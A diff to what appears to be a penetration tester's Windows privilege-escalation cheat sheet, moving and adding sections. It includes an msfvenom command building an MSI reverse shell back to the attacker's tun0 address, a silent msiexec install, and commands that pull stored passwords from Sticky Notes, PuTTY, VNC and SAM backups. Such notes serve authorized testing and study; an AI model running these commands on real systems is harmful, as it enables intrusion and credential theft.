@@ -330,7 +330,7 @@ wes /tmp/systeminfo.txt -c -e --definitions /opt/wesng/definitions.zip -i 'Remot
 ```
 
 ```
-windows-exploit-suggester.py --systeminfo /tmp/systeminfo.txt -d /opt/winreconpack/2022-08-20-mssb.xls
+windows-exploit-suggester.py --systeminfo /tmp/systeminfo.txt -d /opt/winreconpack/2022-10-09-mssb.xls
 ```
 
 ### Test For Previously Used credentials
@@ -416,6 +416,60 @@ shutdown /r /t 0
 
 **SeTakeOwndershipPrivilege**
 
+### Test For alwayselevated
+
+Both must queryies must return `0x1`
+
+```
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+```
+
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+```
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp HOST=$tun0 LPORT=53 -f msi -o thescriptkid.msi
+```
+
+```
+msiexec /quiet /qn /i C:\Windows\Temp\thescriptkid.msi
+```
+
+### Test For Insecure Sam and System backups
+
+```
+accesschk.exe -qlv C:\Windows\repair\Sam
+```
+
+```
+accesschk.exe -qlv C:\Windows\repair\System
+```
+
+### Non-default Programs Discovery
+
+This may reveal vulnerable server software or client software to elevate privileges
+
+```
+cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+```
+
+```
+dir "C:\Program Files"
+```
+
+```
+dir "C:\Program Files (x86)"
+```
+
+```
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+```
+
+```
+accesschk.exe -uws "Everyone" "C:\Program Files"
+```
+
 ### Test For Plaintext passwords
 
 #### In Unattended Files
@@ -456,6 +510,12 @@ reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 type C:\Users\%USERNAME%\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
 ```
 
+Or with PowerShell
+
+```
+type $home\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
+```
+
 #### In Clipboard
 
 ```
@@ -472,6 +532,12 @@ reg query "HKCU\Software\ORL\WinVNC3\Password"
 
 ```
 reg query HKEY_CURRENT_USER\Software\%username%\Putty\Sessions\ /f "Proxy" /s
+```
+
+Or With PowerShell
+
+```
+reg query HKEY_CURRENT_USER\Software\$env:username\Putty\Sessions\ /f "Proxy" /s
 ```
 
 #### In Powershell History
@@ -496,26 +562,6 @@ type C:\inetpub\wwwroot\web.config | findstr connectionString
 findstr /si password *.txt *.ini *.config *.php *.pl *.xml *.xls *.xlsx *.csv *.doc *.docx
 ```
 
-### Test For alwayselevated
-
-Both must queryies must return `0x1`
-
-```
-reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-```
-
-```
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
-```
-
-```
-msfvenom -p windows/x64/shell_reverse_tcp HOST=$tun0 LPORT=53 -f msi -o thescriptkid.msi
-```
-
-```
-msiexec /quiet /qn /i C:\Windows\Temp\thescriptkid.msi
-```
-
 ### Test For AutoRuns
 
 ```
@@ -526,40 +572,10 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 accesschk.exe -qlwv C:\path\to\executeable
 ```
 
-### Test For Insecure Sam and System backups
-
-```
-accesschk.exe -qlv C:\Windows\repair\Sam
-```
-
-```
-accesschk.exe -qlv C:\Windows\repair\System
-```
-
 ### Unmount Disks
 
 ```
 mountvol
-```
-
-### Non-default Programs Discovery
-
-This may reveal vulnerable server software or client software to elevate privileges
-
-```
-dir "C:\Program Files"
-```
-
-```
-dir "C:\Program Files (x86)"
-```
-
-```
-Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
-```
-
-```
-accesschk.exe -uws "Everyone" "C:\Program Files"
 ```
 
 ### Test Services
